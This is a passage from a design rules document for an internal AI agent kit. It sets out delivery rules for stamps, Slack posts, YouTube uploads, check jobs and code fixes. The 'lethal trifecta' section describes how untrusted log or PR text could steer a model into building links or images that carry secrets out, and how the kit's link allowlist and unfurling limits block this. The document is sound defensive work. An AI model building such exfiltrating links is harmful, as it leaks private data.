  the input's `stamps` (`repo`, `path`, the `commit` the page is read
  at, `key`, `value`), and the model never writes them: the PR checker
  refuses a change to a stamp key like any other frontmatter key, and
  `flax agents check` refuses a key in both `stamp_keys` and
  `frontmatter_keys`. After the PR checker passes, a stamp that names a
  repository or path outside the job's, a key outside `stamp_keys`, a
  value that is not letters, digits, `. _ / + -` and single spaces (at
  most 200 characters), a commit other than the one its repository's
  pages were read at, or a page stamped twice for one key fails the run.
  A stamp on a page the model was given applies only when the answer lists
  that page (a patch or `no_change`); a stamp on a page it was not given
  always applies, read at the base commit. A stamp replaces the key's one
  line in the frontmatter and nothing else; a page without that key, or
  where it spans more lines, fails delivery with nothing written. Stamps
  do not count toward `max_changed_lines`, go through the
  untrusted-input gate like the rest of the plan, and are listed in the
  pull request under their own heading.
- **Where:** `src/deliver/stamps.ts`, `src/deliver/plan.ts`,
  `src/deliver/deliver.ts`, `src/run-job/pr-output.ts`,
  `schema/job.schema.json`, `src/check/allowlists.ts`.
- **Why:** some frontmatter records a fact the code knows exactly and the
  model should never guess, such as the commit an atlas doc now describes
  (`analyzed_commit`). Letting code set it keeps it exact, and keeps the
  model's patch free of frontmatter it has no evidence for.
- **Tests:** `test/deliver.test.ts` (reading and refusing stamps,
  replacing one line, which pages get them, the base commit, delivery and
  the pull request text), `test/run-job-pr.test.ts` (stamps alone
  delivered with no second check, a stamp key job.yml does not name),
  `test/job-schema.test.ts`, `test/allowlists.test.ts`,
  `test/atlas-doc-refresh.test.ts` (the job's fixture run in shadow).

## Slack messages are posted by kit code, once, to a listed channel

- **Rule:** only a run of a job with `output.kind: slack` posts, never a
  stub run or `--preflight`: a live run to the job's own channel and
  nowhere else, a shadow run to the shadow channel (`shadow` in
  `channels.yml`, #agents-shadow) and nowhere else, and a shadow run
  posts nothing when the shadow channel has no id. It posts only after the schema, the quotes and the untrusted-input gate
  let it. Before posting, in every mode, the message is held to the kit's
  rules, changing only what breaks them, so a message that keeps them looks
  exactly as rendered: the link rules of the next section, and in `mrkdwn`
  text (the fallback text too) every `<...>` token that is not a link
  (`<!here>`, `<!channel>`, `<!everyone>`, `<@user>`, `<#channel>`,
  `<!subteam^...>`, dates) is shown as text, and bare `@here`, `@channel`
  and `@everyone` get a word joiner after the `@`. Headers are
  `plain_text`, which Slack does not parse. Each change is listed in the
  report. Then the message must fit Slack and the kit: at most 50 blocks,
  the block rules above, a fallback text of at most 3,000 characters, and
  at most 40,000 bytes of JSON for the text and blocks together; one that
  does not fails the run and posts nothing. `delivery/slack.json` keeps
  the exact `chat.postMessage` body in every mode. A shadow post is the
  same message under one more context block, "Shadow run of <job>, not a
  live post. Live, it posts to #<channel>.", with the same words leading
  the fallback text. To post, the runner reads
  `SLACK_AGENTS_POST_TOKEN` (a live run, or a shadow run while the shadow
  channel has an id, refuses to start without it), calls `auth.test`, and refuses the token unless Slack reports a bot
  token with exactly the scope `chat:write` (so no
  `chat:write.customize`: the message always shows the app's own bot name
  and icon). It posts once, by channel id (the `id` of the job's channel
  in the `post` list, or of the shadow channel), with `link_names` off and no username or icon; a
  second post in the same run is refused. A post Slack refuses with a rate
  limit (HTTP 429) is retried after `Retry-After`, at most 3 tries and 30
  seconds a wait; no other failure is retried, since the message may have
  been posted. The report records the channel, the message's `ts` and its
  permalink.
- **Where:** `src/deliver/slack-message.ts` (the message rules),
  `src/deliver/slack-poster.ts` (the token check and the one post),
  `src/run-job/slack-output.ts`, the slack step in `src/run-job/run.ts`,
  `src/run-job/load.ts`, `src/check/allowlists.ts` (a live job's channel
  has an id), `src/lib/allowlists.ts` (the shadow channel),
  `deliverySecrets` in `src/generate/render.ts`.
- **Why:** the model never holds a write credential, and the code that
  does is small enough to read and test on every path. Mentions page
  people, so model text may not make them. A token with only `chat:write`
  can post as the app and nothing else, so a leak costs at most spam in the
  channels the app was invited to. Retrying only a refused post keeps a
  run to one message. Shadow runs post to a channel of their own so a
  whole run, the post included, can be compared with the workstation job
  it would replace; the marked line keeps a shadow post from being taken
  for a live one, and going live then changes only where the message goes.
- **Tests:** `test/slack-delivery.test.ts` (a system-health-report
  message looks unchanged; mentions; the limits; against
  a fake Slack API: the exact request, one post, rate limit retries, error
  codes, no retry after a failure that may have posted, the token's scopes;
  end to end: shadow with and without a shadow channel id, stub, live, the
  token only in the delivery step and scrubbed, a channel not in the post
  list or without an id, the shadow channel checks; the workflow secret,
  live and shadow).

## A posted message cannot carry data out (the lethal trifecta)

- **Rule:** in every posted message, only links whose URL starts with a
  prefix in the `links` list of `channels.yml` (our GitHub organization,
  our OpenObserve and our Slack workspace today), or is exactly the run's
  own workflow link, are links. In `mrkdwn` text, any other `<url|label>`
  becomes its label and any other `<url>` its URL as plain text; a URL
  counts only if it is `https`, has no user or password, and still starts
  with the prefix once parsed (so `..` cannot climb out of it). Every
  `mrkdwn` text is posted with `verbatim: true`, so Slack turns nothing
  into a link by itself: a bare URL, domain, channel name or mention in
  model text stays plain text. The fallback text, which has no verbatim,
  loses every bare URL off the list ("(link removed)"). Every post has
  `unfurl_links` and `unfurl_media` off, so Slack never fetches a URL of
  the message on its own. No message may carry an image: the block rules
  allow no `image` block, no image element and no `accessory`, and a
  section or context text must be `mrkdwn`.
- **Where:** `cleanMessage` and `linkAllowed` in
  `src/deliver/slack-message.ts`, the request body in
  `src/deliver/slack-poster.ts`, the block rules in
  `src/run-job/slack-render.ts`, `links` in `channels.yml` (code owner
  review) and `src/lib/allowlists.ts`.
- **Why:** a run holds private data (logs, cluster state, code), reads
  untrusted content (log lines, alert messages, pull request text), and
  its message is a way out: those three together are the lethal trifecta.
  The box has no network, so the delivered message is the one remaining
  channel. Text steered by a log line could build a link or image whose
  URL carries secrets in its path or query string; Slack would fetch it to
  unfurl or render it, or a reader would click it. With links held to our
  own hosts, Slack's own linking off, unfurling off and no images, what a
  misled run writes can be wrong, but it cannot send data anywhere but our
  own systems.
- **Tests:** `test/slack-delivery.test.ts` (a model-written link to an
  unknown host with data in its query string is posted as plain text and
  not unfurled, in blocks and in the fallback text; lookalike hosts, `..`,
  user info, `http` and other schemes; the run's own link kept; verbatim on
  every `mrkdwn` text; image blocks, image elements, accessories and
  `plain_text` sections refused; unfurling off in every request),
  `test/allowlists.test.ts` (the `links` list).

## Check jobs run no model, and compare only with their own earlier runs

- **Rule:** a job with `output.kind: results` is a check job: `flax agents check`
  refuses it with any model but `none`, with a `media.model` or with
  `media.parts`, and without `trigger.envs`; `trigger.envs` belongs to
  check jobs alone, and no two of its crons are the same (the workflow
  tells the environments apart by the cron that fired). Its `alert` is in
  the `post` list of `channels.yml`, with an id once live. A run checks
  the one environment `--env` names, one of the job's (a stub run takes
  the first), and refuses a `--reason` that is not one line of printable
  ASCII. Its results artifact is named for the job, the environment and,
  in shadow, `shadow`, so a run compares only with the same job,
  environment and mode. The runner finds the previous run's artifact with
  the workflow's own token, `actions: read` and nothing more, in a step of
  its own; the download action fetches it and the run step gets no token.
  The run writes the manifest's files and `media.json`, each read again
  against its sha256, and its `index.json`, and refuses all of them when
  any holds a secret value. Alerts follow the Slack rules above (one post,
  kit message rules, the shadow channel in shadow, nothing in a stub run).
- **Where:** `src/check/check-jobs.ts`, `src/deliver/check-results.ts`,
  `src/run-job/results-output.ts`, `src/run-job/previous-results.ts`,
  `src/run-job/no-model.ts`, `deliverySecrets`, `targetEnvExpression` and
  `previousResultsSteps` in `src/generate/render.ts`.
- **Why:** a check run must mean the same thing every time, so no model
  takes part in it. Comparing only within one job, environment and mode
  keeps a shadow run from ever deciding a live alert.
- **Tests:** `test/results.test.ts` (transitions, the alert, shadow, a lost
  alert, secrets, stub, a run without results, finding the previous run,
  the checks, the workflow, the run options).

## YouTube uploads are private, checked, and recorded by kit code

- **Rule:** only a live run of a job with `output.kind: youtube` uploads,
  never a shadow or stub run or `--preflight`. The job runs no model
  (`model: none`): the kit builds the answer from the media manifest's
  `data.scenarios` and holds it to the rules a model's answer would be
  held to: a title of at most 100 characters on one line, a description of
  at most 5,000 bytes counting the chapter lines the kit appends, tags of
  at most 500 characters as YouTube counts them and without commas, no
  `<`, `>` or control character in any text, chapters none or at least
  three from 0 and at least 10 seconds apart, no timestamp line of the
  scenario's own in the description, and links in every text only to
  hosts in `link-hosts.yml`. A scenario that breaks a rule fails the run
  before anything is uploaded. Every file used is a regular file inside
  the media directory whose size and sha256 match `media.json`, checked
  before planning and again right before its bytes are uploaded. A plan
  of more than 4 uploads is refused. The map file is read with a reader
  app token for `docs_repo` only, with contents, metadata and pull
  requests read and nothing more, revoked after the read; a scenario whose
  media hash the map records, or whose `source` the map records when the
  media stage gave one, is not uploaded again, and nothing is
  uploaded while one of the job's map pull requests is open. Live, the
  runner refuses a grant with any scope but `youtube.upload` and
  `youtube.force-ssl`, and one that `channels.list?mine=true` does not
  answer with exactly `YOUTUBE_CHANNEL_ID`, before any upload. Every
  upload has `privacyStatus: private`, and the uploader refuses any other;
  there is no call that publishes, deletes or changes another video, or
  creates a playlist; a playlist the channel does not have, or has twice,
  refuses the upload. The upload bytes go only to the session address on
  YouTube's upload host. The ids are recorded in one pull request on
  `docs_repo` by the writer app, on `agent/<job>/<YYYY-MM-DD>`, after
  checking the map at the base commit is exactly the file the run read;
  the video titles appear in its body only as escaped plain text. With
  `docs_source_dir`, the same commit adds each uploaded video's scenario
  source file from the media stage, a JSON file of at most 256 KiB that
  is UTF-8, holds no secret value and passed its sha256 check twice; a
  shadow run keeps it in the report and commits nothing. Items a video
  left out (`leftOut`) are at most 8, each clipped to one line, and
  appear in the pull request and the notice only escaped. With
  `notify`, one review notice is posted under the Slack message rules;
  a shadow run posts one line with the run link to the shadow channel
  instead, or nothing when that channel has no id. A media stage that
  made no video ends the run with nothing to deliver.
  The access token is forgotten at the end, not revoked (revoking ends the
  refresh token too).
- **Where:** `src/output-check/youtube.ts` (the metadata rules),
  `src/deliver/media.ts` (the manifest and the file checks),
  `src/deliver/youtube.ts` (the grant, the channel check and the calls),
  `src/deliver/video-map.ts` (the map read and its pull request),
  `src/run-job/youtube-output.ts`, `src/run-job/no-model.ts`,
  `src/check/allowlists.ts`, `deliverySecrets` in
  `src/generate/render.ts`.
- **Why:** an upload to the company channel is public-facing work under
  the company's name, and YouTube's quota allows about four a day. Private
  uploads keep a person between the kit and the public: they watch each
  video and publish it in Studio. The scenario text is reviewed with the
  narration, so no model is needed to publish; the same text rules still
  hold, since a description link is a way out like any other. The channel
  check stops a grant made for the wrong channel (a personal one) from
  publishing there. The skip rule and the open pull request rule keep a
  run from spending quota on, or duplicating, a video that is already up.
- **Tests:** `test/youtube-metadata.test.ts` (every metadata rule, the
  manifest, the media hash with a known vector, file re-checks),
  `test/youtube-api.test.ts` (against a fake Google token endpoint and
  YouTube API: the exact requests, the scope and channel refusals, the
  resumable upload and its resume, the upload host, captions, thumbnail,
  playlists, error reasons), `test/youtube-delivery.test.ts` (the map read
  and its pull request, the plan in shadow, skip by hash and by source,
  the source recorded in the map, the upload
  limit, the open pull request wait, a live run end to end with the
  notice, a wrong channel, a partial failure, the secrets kept from the
  report, the no-model checks and workflow, the scenario sources
  committed and refused, the video noun, the left-out items, the shadow
  line, a run with no video, and the notice and pull request unchanged
  for a job that sets none of these).

## A run started by hand can pick another listed model and thinking level

- **Rule:** every generated job workflow offers the models in `models.yml`
  as a choice when started by hand, defaulting to the job's own `model`,
  and the thinking levels any of those models takes, defaulting to the
  job's own `thinking`. Each choice reaches the runner through an
  environment variable, never inside the command text, as `--model` and
  `--thinking`; an empty value (scheduled and chained runs have no inputs)
  means the job's own. The runner refuses a model that is not in
  `models.yml`, a level Pi does not take, and a level off the model's
  `thinking` list, checks the budget at the chosen model's prices, passes
  the level to Pi as `--thinking` on every run, and records the model and
  the level in the report.
- **Where:** `src/generate/render.ts` (the input and both run-job
  steps), `src/run-job/load.ts`, `src/run-job/cli.ts`, `piCommand` in
  `src/run-job/argv.ts`.
- **Why:** comparing models and levels on the same job is part of proving a
  job, and the allowlist and the budget should hold for any model a run
  uses, not only the one in `job.yml`. Passing the level every time keeps
  a run from falling back to Pi's default, which the plugin and Pi then
  move to whatever the model takes.
- **Tests:** `test/model-choice.test.ts`, `test/run-job-argv.test.ts`,
  `test/runner-bundle.test.ts`.

## A run with nothing to do calls no model

- **Rule:** when the input `collect.ts` prints has a top-level
  `nothing_to_do` (one line, at most 500 characters), the run stops right
  after keeping the input: no model key is issued, no box starts, nothing
  is delivered, and the run passes with the reason in `status.json`
  (`nothingToDo`) and the summary. A malformed one fails the run. A
  revision never reads it.
- **Where:** `nothingToDoReason` in `src/run-job/input.ts`, called from
  `src/run-job/run.ts`; `nothingToDo()` in `src/collect/env.ts`.
- **Why:** a job that polls often (every hour, for crashes) should cost
  nothing when there is nothing to look at.
- **Tests:** `test/run-job-collect-inputs.test.ts` (no key, no box, the
  reason, a stub run's fixture, a malformed reason, no shipped job's
  fixture says it).

## Collect inputs reach collect.ts only as checked strings

- **Rule:** `collect_inputs` in `job.yml` (at most 4, each with a
  pattern from `^` to `$`) become string inputs of the job's workflow.
  Each value reaches the run step through an environment variable, never
  inside the command text, as `--collect-input <name>=<value>`; the
  runner refuses a name the job does not declare, a value over 200
  printable ASCII characters or off its pattern, and any value in a
  revision or a replay, before anything starts, and gives `collect.ts`
  the filled ones as JSON in `FLAX_AGENTS_COLLECT_INPUTS` (read with
  `collectInputs()`); the report records them. `flax agents check` refuses
  them for a job with `model: none` or without `collect.ts`, a name the
  workflow already has, a pattern JavaScript does not take, and more
  workflow inputs than GitHub allows.
- **Where:** `src/check/job-options.ts`, `src/generate/render.ts`,
  `src/run-job/cli.ts`, `src/run-job/collect-inputs.ts`,
  `src/run-job/run.ts`.
- **Why:** a person replaying one crash names it by hand; what they type
  is untrusted and must not reach a shell or `collect.ts` unchecked.
- **Tests:** `test/run-job-collect-inputs.test.ts`.

## A run that publishes nothing posts its analysis through kit code

- **Rule:** a pull request job's `publish.ts` that publishes nothing may
  give a `message` (`{ text, blocks }` under `render.ts`'s rules, or
  `"render"` for `render.ts`'s message). The kit adds the footer,
  scrubs every string as tool results are scrubbed, cleans links and
  mentions as for a slack job, keeps the body in
  `delivery/analysis.json`, holds it to the untrusted-input gate of
  `output.untrusted_input`, and posts it once: live to `output.notify`,
  in shadow to the shadow channel under the shadow line, never in a stub
  run, and never without `notify`.
- **Where:** `src/run-job/analysis-output.ts`,
  `src/run-job/publish-script.ts`, `src/run-job/run.ts`.
- **Why:** many investigations end without a change to propose (an
  infrastructure problem, not enough proof); the reader still needs the
  finding, and it must not leak what a pull request body would not.
- **Tests:** `test/pr-analysis.test.ts`.

## A code fix stays inside its repository's code paths and cites the code it changes

- **Rule:** for a pull request job with `output.code_fix: true`, the PR
  checker lets a change cite a file the job may change (the code being
  fixed, usually at the deployed commit), which a docs job may never do,
  and then holds every page to its repository's `code` settings in
  `repos.yml`: inside `code.paths`, a created file inside `code.tests`,
  and never a workflow, build or dependency file, lockfile, Dockerfile,
  chart or migration (`NEVER_CODE_FIX`), whatever the globs say. A
  TypeScript or JavaScript file may change beyond its literal values, and
  in a source file `![...]` is code, not a Markdown image; every other
  rule holds, links included. `flax agents check` refuses the option for a
  repository without `code`, for `notes-co/agents` (the kit's
  own code), and for a glob, in `job.yml` or `repos.yml`, that names one
  of those files. `output.draft: true` opens each pull request as a
  draft.
- **Where:** `codeFixPathProblems`, `citationProblem` and `checkPage` in
  `src/output-check/pr.ts`, `linkProblems` in
  `src/output-check/links.ts`, `RepoCode` in `src/lib/allowlists.ts`,
  `src/check/job-options.ts`, `openPull` in `src/deliver/github-writer.ts`.
- **Why:** a fix's evidence is the code it changes, and a crash fix must
  never reach into what builds, ships or migrates the service: those
  changes need a person whatever the crash says.
- **Tests:** `test/code-fix-kit.test.ts`.

## The second check holds a code fix to the code-fix rules and reads its body

- **Rule:** the second check of a job with `output.code_fix` gets its own
  prompt (`reviewPrompt(true)`) and kit rules (`codeFixRules`): only what
  fixes, guards, tests or adds diagnostics for the failure; every line
  supported by the code it changes at the cited commit or the failure's
  quoted log lines; no change for inputs that did not fail; tests on
  synthetic input; no suspicion stated as fact. Its input carries the
  body sections `publish.ts` wrote (`body`), and a body that overstates
  the cause rejects the whole proposal. Every other job's prompt and rules
  are as they were.
- **Where:** `src/run-job/review.ts`, `runPrStage` in
  `src/run-job/pr-output.ts`, `src/run-job/run.ts`.
- **Why:** the docs rules ("change facts only", frontmatter) say nothing
  about whether a code change is safe, and a crash explanation is only as
  good as the evidence it cites.
- **Tests:** `test/code-fix-kit.test.ts`, `test/crash-investigator.test.ts`
  (the stub run's second check input).

## A ledger is collect.ts's own, kept between runs as an artifact

- **Rule:** a job with `ledger: true` (a model and a `collect.ts`) gets
  the previous run's ledger, found by the runner with the workflow's
  token (`actions: read`) as the newest `job-<name>-ledger` artifact of
  another run, downloaded by the workflow and copied into the run
  directory; `collect.ts` reads it with `readLedger()` and writes the next
  with `writeLedger()`. The runner keeps it only when it is one JSON
  object of at most 256 KB (a bad one fails the run; a bad previous one is
  ignored, with the reason in `status.json`), and the workflow uploads it
  after the run, whatever happened. Nothing else reads it; it reaches the
  model only as far as `collect.ts` puts it in the input.
- **Where:** `src/run-job/job-ledger.ts`, `src/collect/env.ts`,
  `ledgerSteps` in `src/generate/render.ts`, `src/run-job/run.ts`,
  `src/check/job-options.ts`.
- **Why:** an hourly job must remember what it already did, in shadow as
  in live, without a database of its own.
- **Tests:** `test/code-fix-kit.test.ts`, `test/crash-investigator.test.ts`.

## Log text reaches a crash investigation's body only as a string literal

- **Rule:** the crash investigator's `publish.ts` shows a log line only as
  the template of a string literal in our code that printed it, its
  variable parts masked as `<value>`, or as a message a runtime prints
  itself; literals come from `collect.ts` (gh-grep at the deployed
  commit) or from a gh-grep quote the kit checked. In the model's prose a
  whole raw line becomes its template or a note, and any other piece of
  24 characters or more of a raw line, or a quoted span of one, that is
  not our code's text is left out. Rust, Java, Scala and TypeScript
  literals are read with their format placeholders.
- **Where:** `src/output-check/string-literals.ts`,
  `src/collect/crash-report.ts`, `jobs/crash-investigator/publish.ts`.
- **Why:** a log line can carry customer data; a literal in our code
  cannot.
- **Tests:** `test/crash-investigator.test.ts`.

## Also covered by tests

- `flax agents new-job` creates a job that passes every check once generated, writes
  every `job.yml` field, and refuses taken or invalid names
  (`test/new-job.test.ts`).
- `jobs/system-health-report/collect.ts` makes its fixture input from fake tool
  answers and calls only its `collect_tools`, and its `render.ts` follows
  chicory's layout rules (`test/system-health-report.test.ts`, fakes in
  `test/system-health-report-fake.ts`); `pnpm compare-chicory` pairs attention
  items, applies the 30-minute rule and prices tokens
  (`test/compare-chicory.test.ts`).
- `flax agents run-job` builds the exact `lbx --run` command line, reads lbx's
  status file before its status line, fails a run whose answer does not
  match `output.json` after its one repair turn, refuses live jobs other than pull request and slack jobs and
  runs whose worst case would pass the monthly limit, runs `collect.ts` only in real runs, and keeps the
  input in the report (`test/run-job*.test.ts`, with a stand-in `lbx` in
  `test/fake-lbx.ts` that can also play the Pi plugin's side of the
  tools socket, call the model through the model socket, and
  answer the runner's probe for `--socket-dir` and `--no-network`).
- `pnpm replay-build` reads each replay page and excerpt at its pinned
  commit and refuses quoted lines a commit does not have; the committed
  replay input matches `src/docs-drift/sources.ts`, and its answer key
  points at real lines; the grade sheet shuffles by seed and keeps model
  names out (`test/docs-drift-replay.test.ts`).
